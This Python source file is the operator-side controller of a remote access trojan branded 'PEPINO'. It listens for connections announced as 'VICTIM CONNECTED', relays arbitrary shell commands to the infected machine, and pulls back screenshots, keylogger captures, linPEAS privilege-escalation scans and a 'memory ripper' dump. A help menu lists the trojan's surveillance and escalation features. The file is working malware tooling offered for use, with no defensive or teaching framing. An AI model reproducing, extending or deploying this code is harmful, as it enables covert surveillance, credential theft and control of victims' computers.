import socket
import threading
import time 
from colorama import Fore, Back, Style, init
import sys
import signal
import os


isConnected = False
conn = None
stop = False
threadServer = None
stopThread = False

def send(mensaje):
    global conn
    try:
        conn.send(mensaje.encode()) 
    except socket.error as e:
        print(f"[-] Error: {e}")

def recibir_mensaje(conn, buffer_size=4096):

    try:
        data = conn.recv(buffer_size)  
        if not data:
            return None
        return data.decode() 
    except socket.error as e:
        print(f"[-] Error: {e}")
        return None

# Returns the number of the new file
def existsFile(baseFileName,extension):
    number = 0
    while os.path.isfile(baseFileName + str(number) + extension):
        number += 1
    return number

def recvLen():
    global conn
    i = 0
    while i < 10:  
        try:
            dat = conn.recv(1024)
            decoded = dat.decode()
            if "len-" in decoded:
                return int(decoded.split("-")[1])
        except Exception as f:
            print(f)
            

def recvFiles(filename, extension):
    global conn, stop
    try:
        ln = recvLen()
        totalRecv = 0
        print(f"[i] FILE LENGTH RECIVED {ln}")
        def file(filename, extension):
            name = ""
            if extension == ".png":
                name = filename + str(existsFile(filename,".png")) + ".png"
            else:
                name = filename + str(existsFile(filename, extension)) + extension
                
            return name
        
        if ln != None:
            with open(file(filename,extension), "wb") as f:
                while totalRecv != ln:
                    data = conn.recv(4096)
                    f.write(data)
                    totalRecv += len(data)
                print(f"[+] FILE SAVED | {totalRecv} BYTES RECIVED")
            stop = False
        else:
            print("[-] ERROR ")
    except Exception as e:
        print(f"Error: {e}")
        stop = False 



    

def iniciar_servidor(host='127.0.0.1', port=5656):
    global isConnected,conn,stop,stopThread
 
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as servidor:
        servidor.bind((host, port))
        servidor.listen()
        print(f"[+] Server listening in {host}:{port}")
        
        while not stopThread:
            conn, addr = servidor.accept()  
            with conn:
                print(f"{Fore.GREEN}[+] VICTIM CONNECTED {Fore.YELLOW}{addr}{Fore.RESET}")
                isConnected = True
                #CONNECTION CHECKER
                while not stopThread:
                    if not stop:
                        mensaje = recibir_mensaje(conn)
                        if mensaje is None:
                            print("[-] CONNECTION CLOSED , RECONNECTING ...")
                            isConnected = False
                            break
                        elif "/check891231" in mensaje:
                            send("/check891231")
                        else:
                            print(mensaje)
                    else:
                        time.sleep(2)

def handler(sig, frame):
    global stopThread
    print(f"\nByeee!{Style.RESET_ALL}")
    stopThread = True
    sys.exit(0)


def confirmation(command):
    choice = input("DO YOU WANT TO EXECUTE: " + Fore.RED + command + Fore.RESET + " ???? y/n ")
    execute = False
    if choice == "y":
        execute = True
    return execute

def filterCommand(command):
    global stop
    if command == "screenshot":
        print("[+] Receiving data...")
        stop = True
        send(command)
        recvFiles("screenshot",".png")
    elif command == "help":
        helpPrinter()
        
    elif command == "linpeas":
        stop = True
        send(command)
        recvFiles("linPEAS", ".txt")
    elif command == "get keylogs":
        stop = True
        send(command)
        recvFiles("keyloggerLoot",".txt")    
        
    elif command == "memory ripper":
        if (confirmation(command)):
            send(command)
        else:
            print("RIPPER ABORTED ")
    else:  
        # SEND THE COMMAND TO THE VICTIM    
        send(command)
                

                    
def helpPrinter():
    print("""
    LIST OF COMMANDS:
    
    > DIRECTORY MOVEMENT (LINUX AND WINDOWS)
        - cd path
        - pwd (gets the current path)
    
    > INFO
        - screenshot
        - status
        - system info
        - logs true
        - logs false
        - show logs
        
    > VULN ENUMERATION
        - winpeas
        - linpeas
        -> force mode: linpeas force
        
    > RIPPERS (!!!)
        - memory ripper

    > HIBERNATE RAT
        - hibernate-10 (hibernates the RAT 10 seconds)
        
    > KEYLOGGER
        - get keylogs
    """)

if __name__ == '__main__':
    signal.signal(signal.SIGINT, handler)
    pepino = f"""{Fore.LIGHTMAGENTA_EX}
    
    +========================================================================+
    |                                                                        |
    |                                                                        |
    | ███████████  ██████████ ███████████  █████ ██████   █████    ███████   |
    |░░███░░░░░███░░███░░░░░█░░███░░░░░███░░███ ░░██████ ░░███   ███░░░░░███ |
    | ░███    ░███ ░███  █ ░  ░███    ░███ ░███  ░███░███ ░███  ███     ░░███|
    | ░██████████  ░██████    ░██████████  ░███  ░███░░███░███ ░███  ..  ░███|
    | ░███░░░░░░   ░███░░█    ░███░░░░░░   ░███  ░███ ░░██████ ░███      ░███|
    | ░███         ░███ ░   █ ░███         ░███  ░███  ░░█████ ░░███     ███ |
    | █████        ██████████ █████        █████ █████  ░░█████ ░░░███████░  |
    |░░░░░        ░░░░░░░░░░ ░░░░░        ░░░░░ ░░░░░    ░░░░░    ░░░░░░░    |
    |                                                                        |
    | {Fore.BLUE} Te meto el pepino.exe :------ {Fore.RESET}                  {Fore.LIGHTCYAN_EX}       By Kaos {Fore.LIGHTMAGENTA_EX}       |
    +========================================================================+

"""



    print(pepino)
    port1 = int(input("SET PORT --> " + Style.RESET_ALL))
    threadServer = threading.Thread(target=iniciar_servidor, args=('127.0.0.1', port1))
    threadServer.start()
    while True:
        if isConnected:
            data = input("")
            filterCommand(data)
        else:
            time.sleep(1)
